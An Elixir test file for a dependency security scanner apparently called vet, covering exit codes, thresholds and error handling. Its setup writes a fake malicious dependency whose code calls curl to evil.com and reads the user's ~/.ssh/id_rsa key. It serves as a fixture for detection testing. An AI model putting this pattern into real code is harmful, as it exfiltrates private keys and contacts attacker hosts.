defmodule VetCli.E2E.ExitCodeTest do
  use ExUnit.Case, async: true

  import ExUnit.CaptureIO

  setup do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_e2e_exit_#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp_dir)

    # Create mix.lock with two deps
    lock_content = ~s(%{\n  "clean_dep": {:hex, :clean_dep, "1.0.0", "abc123", [:mix], [], "hexpm", "def456"},\n  "suspicious_dep": {:hex, :suspicious_dep, "0.1.0", "xyz789", [:mix], [], "hexpm", "uvw012"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock_content)

    # Create clean dep
    clean_lib = Path.join([tmp_dir, "deps", "clean_dep", "lib"])
    File.mkdir_p!(clean_lib)

    File.write!(Path.join(clean_lib, "clean.ex"), """
    defmodule Clean do
      def hello, do: :world
    end
    """)

    File.write!(Path.join([tmp_dir, "deps", "clean_dep", "mix.exs"]), """
    defmodule CleanDep.MixProject do
      use Mix.Project
      def project, do: [app: :clean_dep, version: "1.0.0"]
    end
    """)

    # Create suspicious dep
    sus_lib = Path.join([tmp_dir, "deps", "suspicious_dep", "lib"])
    File.mkdir_p!(sus_lib)

    File.write!(Path.join(sus_lib, "sus.ex"), ~S"""
    defmodule Suspicious do
      System.cmd("curl", ["https://evil.com"])
      def steal, do: File.read!(Path.expand("~/.ssh/id_rsa"))
    end
    """)

    File.write!(Path.join([tmp_dir, "deps", "suspicious_dep", "mix.exs"]), """
    defmodule SuspiciousDep.MixProject do
      use Mix.Project
      def project, do: [app: :suspicious_dep, version: "0.1.0"]
    end
    """)

    on_exit(fn -> File.rm_rf!(tmp_dir) end)
    %{project_path: tmp_dir}
  end

  describe "successful scan below threshold" do
    test "does not raise when threshold is very high", %{project_path: path} do
      # Threshold 200 is unreachable, so no exception should be raised
      capture_io(fn ->
        Mix.Tasks.Vet.run(["--path", path, "--skip-hex", "--threshold", "200"])
      end)
    end
  end

  describe "scan exceeding threshold" do
    test "raises Mix.Error with score and threshold in message", %{project_path: path} do
      error =
        assert_raise Mix.Error, fn ->
          capture_io(fn ->
            Mix.Tasks.Vet.run(["--path", path, "--skip-hex", "--threshold", "1"])
          end)
        end

      assert error.message =~ "exceeds threshold"
      assert error.message =~ "1"
    end
  end

  describe "invalid path" do
    test "raises Mix.Error for non-existent project path" do
      assert_raise Mix.Error, ~r/scan failed/, fn ->
        capture_io(fn ->
          Mix.Tasks.Vet.run(["--path", "/tmp/nonexistent_vet_exit_test_path", "--skip-hex"])
        end)
      end
    end
  end

  describe "invalid format option" do
    test "falls back to terminal format for unknown format", %{project_path: path} do
      # The parser falls back to :terminal for unrecognized formats
      output =
        capture_io(fn ->
          Mix.Tasks.Vet.run(["--path", path, "--skip-hex", "--format", "xml", "--threshold", "200"])
        end)

      # Should produce terminal output (with header), not crash
      assert output =~ "Vet"
    end
  end

  describe "VetCore.scan!/2 vs VetCore.scan/2" do
    test "scan/2 returns {:error, _} for invalid path" do
      result = VetCore.scan("/tmp/nonexistent_vet_scan_test_path", skip_hex: true)
      assert {:error, _reason} = result
    end

    test "scan!/2 raises for invalid path" do
      assert_raise RuntimeError, ~r/scan failed/i, fn ->
        VetCore.scan!("/tmp/nonexistent_vet_scan_test_path", skip_hex: true)
      end
    end

    test "scan/2 returns {:ok, report} for valid project", %{project_path: path} do
      assert {:ok, report} = VetCore.scan(path, skip_hex: true)
      assert %VetCore.Types.ScanReport{} = report
      assert length(report.dependency_reports) == 2
    end

    test "scan!/2 returns report for valid project", %{project_path: path} do
      report = VetCore.scan!(path, skip_hex: true)
      assert %VetCore.Types.ScanReport{} = report
      assert length(report.dependency_reports) == 2
    end
  end
end
